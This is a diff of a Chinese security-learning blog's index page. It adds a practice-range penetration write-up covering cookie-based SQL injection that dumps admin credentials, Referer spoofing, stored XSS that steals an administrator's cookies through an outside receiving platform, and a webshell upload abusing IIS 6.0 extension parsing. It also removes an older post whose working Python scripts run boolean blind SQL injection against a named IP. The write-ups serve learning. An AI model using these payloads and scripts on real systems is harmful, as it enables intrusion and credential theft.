@@ -41,9 +41,9 @@
     <h2 class="author">Iuhrey</h2>
     <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>28</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>29</strong><br>文章</div></a>
       <a href="/categories"><div><strong>3</strong><br>分类</div></a>
-      <a href="/tags"><div><strong>12</strong><br>标签</div></a>
+      <a href="/tags"><div><strong>13</strong><br>标签</div></a>
     </div>
     <ul class="blog-link">
      
@@ -68,6 +68,73 @@
 </div>
 
         <section id="main">
+  
+    <article id="post-一次靶场的注入实战" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/07/15/一次靶场的注入实战/" class="article-date">
+  <time class="post-time" datetime="2018-07-15T00:48:35.000Z" itemprop="datePublished">
+    <span class="post-month">7月</span><br>
+    <span class="post-day">15</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/07/15/一次靶场的注入实战/">记一次靶场的渗透实战</a>
+    </h1>
+  
+
+        <div>
+          
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/日常学习/">日常学习</a>
+  </div>
+
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>之前几天在学linux以及docker的一些基本操作，昨天打一次ctf比赛发现自己水平还是那么菜，好在郁离歌师傅一句”太急了”点醒了我。然后之前靠着一手py搞到了一个靶场，现在刚刚好用到练练手。这一次的题目就是从这里面来的。</p>
+<h1 id="注入拿密码"><a href="#注入拿密码" class="headerlink" title="注入拿密码"></a>注入拿密码</h1><h3 id="初步观察"><a href="#初步观察" class="headerlink" title="初步观察"></a>初步观察</h3><p>打开网站，发现信息量挺多的，不过不急慢慢找突破点。<br>点开首页，然后在接着点开其他链接发现这是一个asp动态网页。<br><img src="/images/15/1.png" alt=""><br><img src="/images/15/2.png" alt=""><br>既然这题目要我们通过注入，那就关注与数据库交互方面的内容。</p>
+<h3 id="找到注入点"><a href="#找到注入点" class="headerlink" title="找到注入点"></a>找到注入点</h3><p>在新闻界面发现了有与数据库交互的内容，一个查询界面通过id号来查询新闻内容。<br><img src="/images/15/3.png" alt=""><br>这里我稍微尝试了一下，试着测试了一下，在get传参的时候有waf拦截了一些关键词查询，这里有两种思路可以选择，第一是通过一些技巧来绕过过滤，不过我在测试的时候发现了一个问题，这里连<strong>‘’</strong>都过滤了，其他可用函数也无法构造完整语句来查询。所以基本可以考虑第二种方式，去找其他注入点，凡是与数据库交互的都是可以注入的。<br>这里我抓了个包，方便我们找出其他交互的点。<br><img src="/images/15/4.png" alt=""><br>抓包之后发现了还有一个cookie可以进行交互，这里可以尝试一下。<br><strong>PS:其实这里我也没想到能这样，源码是通过request来获取id参数值，asp也一般都是通过request来传参，所以我们可以通过cookie来给id进行赋值，而cookie一般是很少过滤的。</strong></p>
+<h3 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h3><p>通过cookies managers+插件改cookie直接访问<a href="http://120.203.13.111:8001/shownews.asp，而不通过get的方式来进行传参。测试是什么类型的注入。值得注意的是，我在测试的时候发现cookie里面的+是被替换为了空格，所以在输入的时候要注意一下。" target="_blank" rel="noopener">http://120.203.13.111:8001/shownews.asp，而不通过get的方式来进行传参。测试是什么类型的注入。值得注意的是，我在测试的时候发现cookie里面的+是被替换为了空格，所以在输入的时候要注意一下。</a><br>输入<strong>id=172-1</strong>的时候发现，它跳到了171的界面，那这个是数字型注入没得跑了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=171 order by 10 回显正常</span><br><span class="line">id=171 order by 11 回显不正常</span><br></pre></td></tr></table></figure></p>
+<p>接着判断回显位数，不过这里需要猜列名，一般的话会有什么admin，admins，user等等，可以试着猜解一下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=171 union select 1,2,3,4,5,6,7,8,9,10 from admin</span><br></pre></td></tr></table></figure></p>
+<p>这里显示出了回显位。<br><img src="/images/15/5.png" alt=""><br>接着爆出username,password。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=171 union select 1，username,password,4,5,6,7,8,9,10 from admin</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/15/6.png" alt=""></p>
+<h3 id="找后台"><a href="#找后台" class="headerlink" title="找后台"></a>找后台</h3><p>现在用户名和密码到手，可以试着去找后台进行登入了。<br>尝试了一下发现后台为120.203.13.111:8001/admin/，然后输入密码和用户就行了，密码记得解个md5。<br><img src="/images/15/7.png" alt=""></p>
+<h1 id="CSRF进后台"><a href="#CSRF进后台" class="headerlink" title="CSRF进后台"></a>CSRF进后台</h1><p>上面这个后台一眼就能看出是假的，所以应该还有真正的后台。<br>用工具扫了扫，发现一堆目录。<br><img src="/images/15/8.png" alt=""><br>既然admin不行，那可以试试admin123<br><img src="/images/15/9.png" alt=""><br>登入进去发现不太对。具体如下：<br><img src="/images/15/10.png" alt=""><br><img src="/images/15/11.png" alt=""><br>分析一下源码可以大致理解这里需要我们更改Referer，也就是从哪里传来的数据包，所以抓包改referer。<br>所以访问我们所要访问的页面，然后进行抓包。<br><img src="/images/15/12.png" alt=""><br>修改http头，注意端口要一致，否则会出现无法响应的情况。<br><img src="/images/15/13.png" alt=""><br><strong>PS:还有一种方法是通过构造本地的链接去访问<a href="http://127.0.0.1/admin123/sysadmin_view.asp" target="_blank" rel="noopener">http://127.0.0.1/admin123/sysadmin_view.asp</a></strong></p>
+<h1 id="XSS拿cookies"><a href="#XSS拿cookies" class="headerlink" title="XSS拿cookies"></a>XSS拿cookies</h1><p>在测试的时候，我们在找注入点的时候发现了还有一个留言板的页面。<br><img src="/images/15/14.png" alt=""><br>这里可以实验一下我们之前在xss挑战赛练习的骚操作。<br>测试的时候发现这里没有过滤任何东西，所以不用考虑绕过的一些技巧。<br>管理员会定时的来查看留言，那么我们只要构造一个导向链接把管理员的cookies导入到我们的接收平台就行了，这里就用网上提供的xss接收平台吧。<br>一键生成Payload，虽然自己也不太会写这些代码。不过能用就行了。<br><img src="/images/15/15.png" alt=""><br>直接把payload丢到留言区等管理员查看就好。<br><img src="/images/15/16.png" alt=""><br>cookie值到手。  </p>
+<h1 id="传马拿shell"><a href="#传马拿shell" class="headerlink" title="传马拿shell"></a>传马拿shell</h1><p>接下来就是找上传文件的地方了。这个ip不仅仅提供了8001端口，还提供了8002端口，8001两个后台都去过了所以接着去8002的后台看看。登入网址为：<a href="http://120.203.13.111:8002/admin/login.asp" target="_blank" rel="noopener">http://120.203.13.111:8002/admin/login.asp</a><br>修改cookie就能进后台了。<br><img src="/images/15/17.png" alt=""><br>找到上传文件的地方。<br><img src="/images/15/18.png" alt=""><br>制作图片马。<br><img src="/images/15/19.png" alt=""><br>菜刀连接的时候发现并不能成功连接，错误提示了IIS6.0无法解析，具体原因我百度了一番。不成功是因为图片马无法被解析<br>IIS6.0是可以使用;，我又试着写了一个<strong>1.asp;1.jpg</strong>的小马上传，但是被检测出了无法上传。这里会检测是否是真的图片。百度的时候还发现了一个IIS6.0的解析缺陷，也就是类似cer，asa，cdx是被忽略没被过滤的，那我们可以试试把图片马后缀名改为cer试试。<br><img src="/images/15/20.png" alt=""><br>成功连接，找敏感文件就行了，这里直接找到flag.txt文件。  </p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>提权后续就不写了，对应的exp百度自行即可，说到底我自己也不会只是单纯的利用人家的工具而已，所以提权就不再往下写了。</p>
+<h2 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h2><p>这算是一次完整的流程吧，经过这一次半实战的演练可以尝试去拿一些其他的站点了。<br>持之以恒！！</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/07/15/一次靶场的注入实战/" data-id="cjsk8gf13001h5cvj89hbki5t" class="article-share-link">分享</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql注入/">sql注入</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
   
     <article id="post-xss挑战赛的Payload-下" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
   <div class="article-meta">
@@ -122,7 +189,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/07/13/xss挑战赛的Payload-下/" data-id="cjp16zkac0015o4vj4evfwpdu" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/07/13/xss挑战赛的Payload-下/" data-id="cjsk8gf0r000z5cvjqjj0d6te" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/">XSS</a></li></ul>
@@ -192,7 +259,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/07/10/xss挑战赛的Payload(上)/" data-id="cjp16zkac0012o4vjue132hqu" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/07/10/xss挑战赛的Payload(上)/" data-id="cjsk8gf0w00155cvj5xsum29b" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/">XSS</a></li></ul>
@@ -253,7 +320,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/06/01/关于xss的一些学习心得/" data-id="cjp16zkar001eo4vjzp7b0v8z" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/06/01/关于xss的一些学习心得/" data-id="cjsk8gf10001b5cvj16qvfow9" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-XSS/">Web XSS</a></li></ul>
@@ -338,7 +405,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/05/25/ISCC之Web的一些wp/" data-id="cjp16zk9w000ho4vj8bh7jmo1" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/05/25/ISCC之Web的一些wp/" data-id="cjsk8gf0o000w5cvjwf2at7tr" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
@@ -397,7 +464,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/05/23/order by和group by在sql注入中的妙用/" data-id="cjp16zk9w000oo4vjt0b6w2nr" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/05/23/order by和group by在sql注入中的妙用/" data-id="cjsk8gf0h000q5cvjsf630wh2" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql注入/">sql注入</a></li></ul>
@@ -554,7 +621,7 @@ while flag:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/05/17/入侵后台的一次尝试/" data-id="cjp16zkar0019o4vjnxaprmrb" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/05/17/入侵后台的一次尝试/" data-id="cjsk8gf12001c5cvj4ed272pm" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
@@ -617,7 +684,7 @@ while flag:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/05/07/CBC字节反转攻击/" data-id="cjp16zk9w000go4vjf9m3q0gx" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/05/07/CBC字节反转攻击/" data-id="cjsk8gf0a000j5cvjsmt9hkeb" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
@@ -682,7 +749,7 @@ while flag:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/05/01/sql注入之报错注入/" data-id="cjp16zkac000xo4vj26byyn3u" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/05/01/sql注入之报错注入/" data-id="cjsk8gf0w00185cvjn9d062yj" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-sql注入/">Web sql注入</a></li></ul>
@@ -740,78 +807,7 @@ while flag:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/04/30/sql注入之时间盲注/" data-id="cjp16zkac000zo4vjmaizl3f3" class="article-share-link">分享</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-sql注入/">Web sql注入</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-  
-    <article id="post-sql注入之布尔型注入" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/04/29/sql注入之布尔型注入/" class="article-date">
-  <time class="post-time" datetime="2018-04-29T04:46:32.000Z" itemprop="datePublished">
-    <span class="post-month">4月</span><br>
-    <span class="post-day">29</span>
-  </time>
-</a>
-   
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/04/29/sql注入之布尔型注入/">sql注入之布尔型注入</a>
-    </h1>
-  
-
-        <div>
-          
-          
-              
-
-          
-        </div>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="布尔型注入"><a href="#布尔型注入" class="headerlink" title="布尔型注入"></a>布尔型注入</h2><p>在过滤了union，仅存select这个关键词的时候，或者是返回并没有显示位时，那我们应该如何使用别的查询语句来查询我们所要的信息呢？或者是我们无法看到之前我们需要的回显位了，那么这个时候我们可以考虑<strong>第一种思路—-布尔型注入</strong>。<br>简而言之，布尔型注入就是判断你查询的语句是否为真，再通过夹逼的方式确定那个值是什么。这就需要用到几个函数了。<br>exists():用于检查子查询是否有返回数据。结果是ture或者false<br>ascii():把字符转化成ascii码<br>substr():substr（string string，num start，num length）截断一部分字符串，偏移从1开始，并不是0<br>count():记录出现的次数<br>接下来在实例中讲解一下布尔型注入的基本思路<br><img src="/images/8/1.png" alt=""><br>这里可以试试我们的联合查询是否可以得到我们想要的结果<img src="/images/8/2.png" alt="">在这里发现并不行，根本没有回显位，所以联合查询的方式肯定是不行的。所以我们考虑使用布尔型注入来试试。试了一个最基本的判断。</p>
-<blockquote>
-<p><a href="http://47.94.13.75/edu/payload/sql/bool.php?id=1%27%20and%20%28select%20length%28database%28%29%29%3E1%29%20--+" target="_blank" rel="noopener">http://47.94.13.75/edu/payload/sql/bool.php?id=1%27%20and%20%28select%20length%28database%28%29%29%3E1%29%20--+</a>  </p>
-</blockquote>
-<p><img src="/images/8/3.png" alt="">这时发现回显正常页面说明，我们可以判断数据库的第一个字符的ascii码&gt;1，虽然这没什么实际的意义，但是它提示了我们可以使用布尔型注入来试出数据库的名称。直接用脚本跑吧<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8  </span><br><span class="line">import string  </span><br><span class="line">import requests  </span><br><span class="line">database = &quot;&quot;  </span><br><span class="line">for i in range(1,10):  </span><br><span class="line">    url = &quot;http://47.94.13.75/edu/payload/sql/bool.php?id=1&apos; and (select(length(database())&gt;%d)) --+&quot; % (i)  </span><br><span class="line">    r1 = requests.get(url)  </span><br><span class="line">    if &quot;you are in .....&quot; not in r1.content:  </span><br><span class="line">        length = i  </span><br><span class="line">        break  </span><br><span class="line">for i in range(1,length+1):  </span><br><span class="line">    for j in range(65,123):  </span><br><span class="line">        url2 =   &quot;http://47.94.13.75/edu/payload/sql/bool.php?id=1&apos; and (select ascii(substr(database(),%d,1))&gt;%d) --+&quot; %(i,j)  </span><br><span class="line">        r2 = requests.get(url2)  </span><br><span class="line">        if &quot;you are in .....&quot; not in r2.content:  </span><br><span class="line">            database = database + chr(j)  </span><br><span class="line">            break  </span><br><span class="line">     length = length + 1  </span><br><span class="line">print database</span><br></pre></td></tr></table></figure></p>
-<p>跑出数据库名称为edutest，然后接着下一步去查询表名。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import string</span><br><span class="line">import requests</span><br><span class="line">tb = &quot;&quot;</span><br><span class="line">tablename = []</span><br><span class="line">for i in range(1,10):</span><br><span class="line">    url = &quot;http://47.94.13.75/edu/payload/sql/bool.php?id=1&apos; and ((select count(table_name) from information_schema.tables where table_schema=0x65647574657374 ) &gt; %d) --+&quot; % (i)</span><br><span class="line">    r1 = requests.get(url)</span><br><span class="line">    if &quot;you are in .....&quot; not in r1.content:</span><br><span class="line">        number = i</span><br><span class="line">        break</span><br><span class="line">print number  #数据库数量</span><br><span class="line">for i in range(0,number):</span><br><span class="line">    for j in range(1,20):</span><br><span class="line">        url2 = &quot;http://47.94.13.75/edu/payload/sql/bool.php?id=1&apos; and ((select length(table_name) from information_schema.tables where table_schema=0x65647574657374 limit %d,1) &gt; %d) --+&quot; % (i,j)</span><br><span class="line">        r2 = requests.get(url2)</span><br><span class="line">        if &quot;you are in .....&quot; not in r2.content:</span><br><span class="line">            length = j</span><br><span class="line">            break</span><br><span class="line">    for k in range(1,length+1):</span><br><span class="line">        for m in range(65,123):</span><br><span class="line">                url3 = &quot;http://47.94.13.75/edu/payload/sql/bool.php?id=1&apos; and ((select ascii(substr(table_name,%d,1)) from information_schema.tables where table_schema=0x65647574657374 limit %d,1) &gt; %d) --+&quot; %(k ,i ,m)</span><br><span class="line">                r3 = requests.get(url3)</span><br><span class="line">                if &quot;you are in .....&quot; not in r3.content:</span><br><span class="line">                    tb = tb + chr(m)</span><br><span class="line">                    break</span><br><span class="line">    tablename.append(tb)</span><br><span class="line">    tb = &quot;&quot; #清除前面的字符串</span><br><span class="line">print tablename</span><br></pre></td></tr></table></figure></p>
-<p>得到以下四个数据库的表名  </p>
-<blockquote>
-<p>[‘admin_logs’, ‘admins’, ‘facebook’, ‘message’]  </p>
-</blockquote>
-<p>接着继续爆破列名，以admin_logs为例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import string</span><br><span class="line">import requests</span><br><span class="line">cl = &quot;&quot;</span><br><span class="line">columnname = []</span><br><span class="line">for i in range(1,10):</span><br><span class="line">    url = &quot;http://47.94.13.75/edu/payload/sql/bool.php?id=1&apos; and ((select count(column_name) from information_schema.columns where table_name=0x61646d696e5f6c6f6773 ) &gt; %d) --+&quot; % (i)</span><br><span class="line">    r1 = requests.get(url)</span><br><span class="line">    if &quot;you are in .....&quot; not in r1.content:</span><br><span class="line">        number = i</span><br><span class="line">        break</span><br><span class="line">print number  #列数</span><br><span class="line">for i in range(0,number):</span><br><span class="line">    for j in range(1,20):</span><br><span class="line">        url2 = &quot;http://47.94.13.75/edu/payload/sql/bool.php?id=1&apos; and ((select length(column_name) from information_schema.columns where table_name=0x61646d696e5f6c6f6773 limit %d,1) &gt; %d) --+&quot; % (i,j)</span><br><span class="line">        r2 = requests.get(url2)</span><br><span class="line">        if &quot;you are in .....&quot; not in r2.content:</span><br><span class="line">            length = j</span><br><span class="line">            break</span><br><span class="line">    for k in range(1,length+1):</span><br><span class="line">        for m in range(65,123):</span><br><span class="line">                url3 = &quot;http://47.94.13.75/edu/payload/sql/bool.php?id=1&apos; and ((select ascii(substr(column_name,%d,1)) from information_schema.columns where table_name=0x61646d696e5f6c6f6773 limit %d,1) &gt; %d) --+&quot; %(k ,i ,m)  </span><br><span class="line">                r3 = requests.get(url3)</span><br><span class="line">                if &quot;you are in .....&quot; not in r3.content:</span><br><span class="line">                    cl = cl + chr(m)</span><br><span class="line">                    break</span><br><span class="line">    columnname.append(cl)</span><br><span class="line">    cl = &quot;&quot; #清除前面的字符串</span><br><span class="line">print columnname</span><br></pre></td></tr></table></figure></p>
-<p>我们爆破得出下面这几个列名  </p>
-<blockquote>
-<p>[‘id’, ‘admin’, ‘ip’, ‘addtime’]  </p>
-</blockquote>
-<p>接着直接查询字段内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import string</span><br><span class="line">import requests</span><br><span class="line">adminname = []</span><br><span class="line">adm = &quot;&quot;</span><br><span class="line">for i in range(99,105): #我测试了一下发现admin有100000个以上，所以在这里就直接爆破第99到104个</span><br><span class="line">    for j in range(1,20):</span><br><span class="line">        url = &quot;http://47.94.13.75/edu/payload/sql/bool.php?id=1&apos; and (length((select admin from admin_logs limit %d,1)) &gt; %d) --+&quot; %(i,j)</span><br><span class="line">        r1 = requests.get(url)</span><br><span class="line">        if &quot;you are in .....&quot; not in r1.content:</span><br><span class="line">            length = j</span><br><span class="line">            break</span><br><span class="line">    for k in range(1,length+1):</span><br><span class="line">        for m in range(65,123): #测试了一下不仅仅是A之后的字符</span><br><span class="line">            url2 = &quot;http://47.94.13.75/edu/payload/sql/bool.php?id=1&apos; and (select ascii(substr((select admin from admin_logs limit %d,1),%d,1)) &gt; %d) --+&quot; %(i,k,m)</span><br><span class="line">            r2 = requests.get(url2)</span><br><span class="line">            if &quot;you are in .....&quot; not in r2.content:</span><br><span class="line">                adm = adm + chr(m)</span><br><span class="line">                break</span><br><span class="line">    adminname.append(adm)</span><br><span class="line">    adm = &quot;&quot;</span><br><span class="line">print adminname</span><br></pre></td></tr></table></figure></p>
-<p>爆破出用户名</p>
-<blockquote>
-<p>[‘fgd’, ‘Artgr’, ‘das’, ‘dddddddddddd’, ‘AAAAAA’, ‘vAdcvAcv’]  </p>
-</blockquote>
-<p>这是最基本的流程，在一些细节的地方还需要多多去尝试，bypass的手段还需要练习。   </p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/04/29/sql注入之布尔型注入/" data-id="cjp16zkac000uo4vj68x35lng" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/04/30/sql注入之时间盲注/" data-id="cjsk8gf0u00125cvjguhto9rf" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-sql注入/">Web sql注入</a></li></ul>
@@ -869,9 +865,9 @@ while flag:
     <h2 class="author">Iuhrey</h2>
     <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>28</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>29</strong><br>文章</div></a>
       <a href="/categories"><div><strong>3</strong><br>分类</div></a>
-      <a href="/tags"><div><strong>12</strong><br>标签</div></a>
+      <a href="/tags"><div><strong>13</strong><br>标签</div></a>
     </div>
 
 
@@ -924,7 +920,7 @@ while flag:
   
   <div class="outer">
     <div id="footer-info" class="inner">
-      &copy;2017 - 2018 Iuhrey<br>
+      &copy;2018 - 2019 Iuhrey<br>
       由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
       主题-<a href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
       
